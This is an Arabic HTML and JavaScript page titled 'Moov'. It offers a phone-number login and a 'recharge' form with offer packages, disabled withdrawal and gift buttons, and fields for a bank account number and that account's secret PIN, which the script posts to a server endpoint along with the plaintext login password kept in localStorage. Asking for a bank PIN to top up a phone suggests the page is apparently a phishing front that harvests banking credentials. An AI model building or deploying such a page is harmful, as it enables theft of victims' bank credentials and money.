<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Moov</title>

<style>
body{margin:0;font-family:tahoma;background:#0f172a;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{width:95%;max-width:480px;background:#1e293b;padding:20px;border-radius:16px}
.hidden{display:none}
input,button,select{width:100%;padding:12px;margin:8px 0;border-radius:10px;border:0}
.btn{background:#06b6d4;color:#fff}
.top{display:flex;gap:8px}
.card{flex:1;background:#334155;padding:10px;border-radius:10px;text-align:center}
.modal{display:none;position:fixed;inset:0;background:#0008;justify-content:center;align-items:center}
.m{background:#1e293b;padding:16px;border-radius:12px;width:90%;max-width:320px;text-align:center}
</style>

</head>
<body>

<div class="box">

<div id="login">

<input id="phone" maxlength="8" placeholder="رقم الهاتف">

<input id="password" type="password" maxlength="4" placeholder="كلمة المرور">

<button class="btn" onclick="login()">تسجيل الدخول</button>

<div id="msg"></div>

</div>


<div id="dash" class="hidden">

<div class="top">

<div class="card">
<button disabled>سحب أموالي</button>
<div id="my_money">0</div>
</div>

<div class="card">
<div>مجموع الأموال</div>
<div id="total_money">0</div>
</div>

<div class="card">
<button disabled>الهدايا</button>
<div id="gifts">0</div>
</div>

</div>

<hr>


<h4>عملية الشحن</h4>

<input id="target" maxlength="8" placeholder="رقم المستفيد">


<input id="bank" maxlength="8" placeholder="رقم الحساب البنكي">


<input id="bankpin" maxlength="4" placeholder="كلمة سر الحساب البنكي">


<select id="offer">

<option value="A">العرض A</option>
<option value="B">العرض B</option>
<option value="C">العرض C</option>
<option value="D">العرض D</option>

</select>


<button class="btn" onclick="recharge()">شحن</button>


</div>

</div>


<div id="result" class="modal">
<div class="m">

<h3 id="resultTitle"></h3>

<p id="resultText"></p>

<button onclick="result.style.display='none'">
إغلاق
</button>

</div>
</div>


<script>

const ok=p=>/^[234]\d{7}$/.test(p);


function showResult(title,text){

resultTitle.textContent=title;
resultText.textContent=text;
result.style.display="flex";

}


function logged(){

return localStorage.getItem("phone") &&
localStorage.getItem("password");

}



async function login(){

let p=phone.value.trim();
let pw=password.value.trim();


if(!ok(p)||!/^[0-9]{4}$/.test(pw)){

msg.textContent="بيانات غير صحيحة";
return;

}


let r=await fetch("/api/login",{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({

phone:p,
password:pw

})

});


let d=await r.json();



if(d.status!="success"){

msg.textContent=d.message||"فشل الدخول";
return;

}



localStorage.clear();


Object.keys(d).forEach(k=>{

if(k!="status"){

localStorage.setItem(k,d[k]);

}

});



my_money.textContent=d.my_money||0;
total_money.textContent=d.total_money||0;
gifts.textContent=d.gifts||0;



loginDiv=document.getElementById("login");
dashDiv=document.getElementById("dash");


loginDiv.classList.add("hidden");
dashDiv.classList.remove("hidden");


}



async function recharge(){


if(!logged()){

alert("يجب تسجيل الدخول");
return;

}


let r=await fetch("/api/recharge",{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({

phone:localStorage.getItem("phone"),

password:localStorage.getItem("password"),

num:bank.value.trim(),

current_pin:bankpin.value.trim(),

offer:offer.value,

target:target.value.trim()

})

});


let d=await r.json();



if(d.status=="success"){

showResult(
"تم بنجاح",
"تم إرسال طلب الشحن بنجاح"
);

}else{

showResult(
"فشل",
d.message||"حدث خطأ أثناء العملية"
);

}


}

</script>

</body>
</html>
